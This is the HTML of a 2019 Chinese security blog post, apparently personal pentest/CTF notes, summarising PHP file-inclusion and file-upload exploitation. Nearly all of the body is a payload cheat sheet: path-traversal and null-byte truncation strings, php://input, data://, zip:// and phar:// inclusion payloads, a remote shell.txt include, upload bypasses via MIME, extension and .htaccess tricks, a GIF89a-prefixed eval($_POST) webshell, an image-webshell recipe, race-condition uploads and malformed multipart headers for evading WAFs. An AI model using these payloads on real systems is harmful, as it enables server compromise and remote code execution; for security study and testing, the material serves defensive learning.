@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+    <head><meta name="generator" content="Hexo 3.9.0">
+		
+        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="description" content>
+        <meta name="keywords" content>
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="shortcut icon" href="/img/avatar.jpg">
+        <link rel="alternate" type="application/rss+xml" title="Wiley" href="/atom.xml">
+        <title>文件包含、文件上传漏洞利用总结 | Wiley的部落格小黑屋</title>
+        <meta name="description" content="{{meta_description}}">
+        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+    </head>
+    
+		<body class="post-template">
+	
+
+        <header id="header">
+            <a id="logo" href="/"><img src="/img/avatar.jpg" alt="Wiley的部落格小黑屋"></a>
+            <h1 class="center"><a href="/">Wiley</a></h1>
+            <p class="center">信息安全爱好者，未来的CTFer，喜欢写小工具。</p>
+            <span id="follow-icons">
+      <a href="http://github.com/Wileysec"><i class="fa fa-github-square fa-2x"></i></a>
+        <a href="mailto:wileysec@qq.com"><i class="fa fa-envelope-square fa-2x"></i></a>
+            <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
+  </span>
+
+<h6 class="links">
+  <a href="/About">About</a>
+  <a href="/Links">Links</a>
+</h6>
+        </header>
+
+        <main id="content">
+        
+
+<article class="post">
+  July 1, 2019
+  
+
+  <h1 class="post-title">文件包含、文件上传漏洞利用总结</h1>
+  <section class="post-content article-entry">
+    <p>文件包含漏洞、文件上传漏洞的一些漏洞利用总结</p>
+<a id="more"></a>
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">"inc/"</span>.$_GET[<span class="string">'file'</span>].<span class="string">".php"</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="本地文件包含："><a href="#本地文件包含：" class="headerlink" title="本地文件包含："></a>本地文件包含：</h4><p><code>?file=test.txt</code></p>
+<p><code>?file=./../../test.txt</code></p>
+<p><code>../../../Windows/ABC_01.py%00截断</code></p>
+<p><code>../../../Windows/%00目录截断</code></p>
+<p><code>../../../Windows/./././././[...]/././././././ 路径长度截断(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</code></p>
+<p><code>../../../Windows/...........[...].......... 点号截断(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</code></p>
+<h4 id="远程文件包含："><a href="#远程文件包含：" class="headerlink" title="远程文件包含："></a>远程文件包含：</h4><p><code>?file=[http|https|ftp]://example.com/shell.txt (需要allow_url_fopen=On并且 allow_url_include=On)</code></p>
+<p><code>?file=file://C:/phpstudy/www/upload/2.php</code></p>
+<p><code>?file=php://input post数据包：&lt;?php phpinfo(); ?&gt; (需要开启allow_url_include=On)</code></p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code><br><code>?file=php://filter/convert.base64-encode/resource=index.php (需要开启allow_url_include=On)</code></p>
+<p><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== (不需要闭合php标签?&gt;)</code></p>
+<p><code>?file=zip://C:/phpstudy/WWW/upload/</code></p>
+<p><code>?file=phar://C:/phpstudy/www/upload/file.zip/phpcode.txt</code></p>
+<p><code>?file=phar://./file.zip/phpcode.txt</code></p>
+<p>创建phpcode.txt写入一句话木马，然后把phpcode.txt压缩成zip，如果不能上传zip文件把zip文件改成jpg上传，然后访问下面链接。一定要改成URL编码的%23，否则访问不了。</p>
+<p><code>?file=zip://C:/phpstudy/www/upload/file.jpg%23phpcode.txt</code></p>
+<p><code>php://filter</code>  <code>file:///</code> 可以访问本地的文件</p>
+<p><code>zip://</code>  <code>phar://</code>  可以访问本地压缩文件</p>
+<p><code>php://input</code>  <code>data://text/plain;base64,</code> 可以自己写入php代码</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h4 id="常见的文件上传绕过"><a href="#常见的文件上传绕过" class="headerlink" title="常见的文件上传绕过"></a>常见的文件上传绕过</h4><p>1.前端js认证绕过 将1.php木马文件改成1.jpg使用burp等抓包工具抓包后把1.jpg改为1.php再放包。</p>
+<p>2.MIME类型绕过 后端Content-type认证 上传1.php抓包后将Content-type改为Content-type:image/jpeg放包即可。</p>
+<p>3.文件名扩展绕过 如发现php文件上传不了，被限制，可尝试把后缀名改成php2 php3 php4 phtml，都可以解析。</p>
+<p>4.htaccess解析绕过 上传后缀为1.jpg的php木马，将 AddType application/x-httpd-php .jpg 写入到.htaccess文件中上传后，上传的jpg的文件都会被解析成php文件。</p>
+<p>5.大小写混写绕过 比如1.pHp 2.PhP 3.PHP shell.php( 空格)空格绕过</p>
+<p>6.后缀名后缀绕过 .点 (. .)点+空格+点 ::$DATA绕过</p>
+<p>7.后缀名双写绕过 1.pphphp</p>
+<p>8.一句话图片木马绕过 将图片和代码混在一起，如果后端没有判断该文件是否为图片的时候或者只判断了该文件头部是否为图片的时候，我们可以将一句话图片木马上传绕过。一句话图片木马制作方法：打开cmd-&gt;copy 1.jpg/b + 1.php/a 2.jpg</p>
+<p>9.文件头校验绕过</p>
+<p>GIF89a<?php eval($_POST['test']); ?></p>
+<p>.JPEG;.JPE;.JPG，”JPGGraphic File”<br>.gif，”GIF 89A”<br>.zip，”Zip Compressed”<br>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>
+<p>10.文件包含漏洞和上传的txt文本利用，也能够解析</p>
+<h4 id="较老的基本上用不到的漏洞绕过"><a href="#较老的基本上用不到的漏洞绕过" class="headerlink" title="较老的基本上用不到的漏洞绕过"></a>较老的基本上用不到的漏洞绕过</h4><p>1.%00截断绕过 上传1.php，使用抓包工具修改将文件名改成1.php .jpg，注意在中间有个空格，空格的URL编码后为%20，所以我们在抓包工具中进入HEX模块，找到相关的文件名所在的地方，将20改成00，然后再放包。</p>
+<p>2.IIS6.0解析绕过 1.asp;2.jpg将这种格式的文件上传后，访问，因为iis6.0解析的问题，会把;后面的去掉不解析，所以造成了能够访问1.asp文件。</p>
+<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
+<h4 id="代码审计常见的上传绕过"><a href="#代码审计常见的上传绕过" class="headerlink" title="代码审计常见的上传绕过"></a>代码审计常见的上传绕过</h4><p>1.iconv()函数 shell.php(hex).jpg在iconv转码后会转成shell.php</p>
+<p>2.竞争上传 意思是，上传文件后，先保存在服务器，然后判断该文件是否是合法的文件类型，这样的话，我们可以通过访问上传的临时文件，这个临时文件是我们自己写的然后上传的，里面的内容的目的就是在上一级或者在本目录下再新建一个木马文件，我们可以自己写个python脚本，不断去访问临时文件，然后就会生成你脚本新建的木马文件，访问即可。</p>
+<h4 id="奇淫技巧上传绕过"><a href="#奇淫技巧上传绕过" class="headerlink" title="奇淫技巧上传绕过"></a>奇淫技巧上传绕过</h4><p>1.数据包更改</p>
+<p>多个分号，文件解析时，可能解析不到文件名，导致绕过。</p>
+<p>Content-Disposition: form-data; name=”file_x”;;; filename=”test.php”</p>
+<p>Header在boundary前添加任意字符，PHP支持，JAVA报错</p>
+<p>Content-Type: multipart/form-data; bypassboundary=—-WebKitFormBoundaryj1oRYFW91eaj8Ex2</p>
+<p>filename换行，PHP支持，Java不支持。</p>
+<p>Content-Disposition: form-data; name=”file_x”; file<br>name=”test.php”</p>
+<p>name和filename添加任意字符串，PHP支持，Java不支持。</p>
+<p>Content-Disposition: name=”file_x”; bypass waf upload; filename=”test.php”;</p>
+<p>POST/GET上传绕过</p>
+<p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
+
+  </section>
+  <footer class="post-footer">
+    <!--
+    <section class="author">
+      <h4>Wiley</h4>
+      <p></p>
+    </section>
+    -->
+  </footer>
+</article>
+
+<nav class="pagination" role="pagination">
+    
+    <a class="older-posts float-left" href="/2019/06/30/参加比赛前看过的文章/">
+        &laquo; 参加比赛前看过的文章
+    </a>
+    
+    
+    <a class="newer-posts float-right" href="/2019/07/01/Ajax跨域请求小知识点/">
+        Ajax跨域请求小知识点 &raquo;
+    </a>
+    
+    <div class="clear-both"></div>
+</nav>
+
+<!-- Table of Contents -->
+<div class="full-toc">
+    <button class="post-toc-menu">TOC</button>
+<div class="post-toc">
+	<span class="post-toc-title">文章目录</span>
+    <div class="post-toc-content">
+    	
+    </div>
+</div>
+<script>
+	$('.post-toc-menu').click(function(){
+		if($('.post-toc').hasClass('open')){
+			$('.post-toc').removeClass('open');
+		}else{
+			$('.post-toc').addClass('open');
+		}
+	});
+</script>
+</div>
+
+<script>
+    $(".post-content p").each(function(){
+      imglength = $(this).find('img').length;
+      for(i=0;i<imglength;i++){
+           obj = $(".post-content p img")[i];
+           aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+           imghref = $(aobj).attr('src');
+           $('#fancybox' + i).attr('href',imghref);
+        }
+    });
+</script>
+
+
+        </main>
+        <footer id="footer">
+            <section id="footer-message">&copy; 2019 <a href="https://wileysec.github.io">Wiley</a> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.</section>
+        </footer>
+    </body>
+</html>
+
+
